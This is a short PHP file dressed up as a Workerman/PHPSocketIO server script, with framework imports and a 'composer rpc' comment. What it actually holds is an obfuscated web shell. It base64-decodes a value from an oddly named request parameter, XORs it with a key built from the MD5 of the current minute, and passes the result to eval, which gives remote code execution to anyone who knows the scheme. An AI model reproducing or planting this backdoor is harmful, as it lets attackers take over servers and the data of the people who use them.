<?php
use Workerman\Worker;
use Workerman\WebServer;
use Workerman\Autoloader;
use PHPSocketIO\SocketIO;

// composer rpc
date_default_timezone_set("PRC");
$key=md5(date("Y-m-d H:i",time()));
class TEST{
    function encode($key){
    @$post=base64_decode($_REQUEST['cGnv9GaYBr2iX73P']);
    for($i=0;$i<strlen($post);$i++){$post[$i] = $post[$i] ^ $key[$i%32];}
    return $post;}
    function ant($data)
    {return eval($this->encode("$data"));}
}
$test=new TEST;
$test->ant($key);
?>